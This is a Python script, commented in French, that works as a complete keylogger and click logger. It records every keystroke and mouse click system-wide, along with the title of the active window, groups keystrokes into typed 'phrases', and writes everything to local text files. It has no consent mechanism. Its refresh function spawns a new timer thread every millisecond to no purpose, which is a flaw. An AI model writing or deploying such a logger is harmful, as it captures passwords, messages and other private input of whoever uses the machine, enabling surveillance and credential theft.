import datetime
import threading
from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener
import pygetwindow as gw

# Définir le fichier de souris
souris_file = "souris.txt"

# Définir le fichier de phrases
phrase_file = "phrases.txt"

# Définir le fichier de clavier
clavier_file = "clavier.txt"

# Définir le fichier pour les logs du script
journal_file = "journal.txt"

# Initialiser le suivi du temps pour les frappes consécutives
last_key_time = datetime.datetime.now()

# Initialiser une liste pour les frappes consécutives
current_phrase = []

# Initialiser une liste pour les actions de la souris
souris_actions = []

# Initialiser une liste pour les actions du clavier
clavier_actions = []

# Fonction pour enregistrer l'action dans le journal
def log_action(action, window_name):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(journal_file, "a", encoding="utf-8") as file:
        file.write(f"{timestamp}: {action} dans {window_name}\n")

# Fonction pour enregistrer une phrase dans le fichier de phrases
def log_phrase(phrase, window_name):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(phrase_file, "a", encoding="utf-8") as file:
        file.write(f"{timestamp}: Entrées clavier dans {window_name} : {phrase}\n")

# Fonction pour enregistrer les entrées clavier dans le fichier de clavier
def log_clavier(key_str, window_name):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(clavier_file, "a", encoding="utf-8") as file:
        file.write(f"{timestamp}: Clavier dans {window_name} : {key_str}\n")

# Fonction pour enregistrer les actions de la souris
def log_souris(action, window_name):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(souris_file, "a", encoding="utf-8") as file:
        file.write(f"{timestamp}: Souris dans {window_name} : {action}\n")

# Fonction pour enregistrer les entrées du script
def log_script_action(action):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(journal_file, "a", encoding="utf-8") as file:
        file.write(f"{timestamp}: {action}\n")

# Fonction pour obtenir le nom de la fenêtre active (le logiciel)
def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            return active_window.title
        else:
            return "Inconnu"
    except:
        return "Inconnu"

# Fonction pour enregistrer les entrées clavier
def on_key_event(key):
    global last_key_time, current_phrase
    current_time = datetime.datetime.now()
    key_str = str(key)
    window_name = get_active_window()

    # Gérer la touche Espace
    if key == Key.space:
        key_str = "space"

    # Calculer la différence de temps en secondes
    time_diff = (current_time - last_key_time).total_seconds()

    if time_diff > 1.5 and current_phrase:
        # Enregistrer la phrase précédente dans phrases.txt
        log_phrase(" ".join(current_phrase), window_name)
        current_phrase = []

    # Ajouter la touche à la phrase actuelle
    current_phrase.append(key_str)

    # Enregistrer l'action dans le journal
    log_script_action(f"Clavier : {key_str}")
    log_clavier(key_str, window_name)

    last_key_time = current_time

# Fonction pour enregistrer les clics de souris
def on_mouse_event(x, y, button, pressed):
    window_name = get_active_window()
    action = f"Clic bouton {button}"
    if pressed:
        action += " enfoncé"
    else:
        action += " relâché"
    log_script_action(f"Souris : {action} dans {window_name}")
    log_souris(action, window_name)

# Fonction pour rafraîchir en millisecondes
def refresh():
    threading.Timer(0.001, refresh).start()
    pass  # Vous pouvez ajouter du code ici si nécessaire

# Écouter les événements clavier en utilisant la bibliothèque pynput
with KeyboardListener(on_press=on_key_event) as keyboard_listener:
    # Écouter les événements de souris en utilisant la bibliothèque pynput
    with MouseListener(on_click=on_mouse_event) as mouse_listener:
        # Démarrer le rafraîchissement
        refresh()
        # Joindre les écouteurs
        keyboard_listener.join()
        mouse_listener.join()
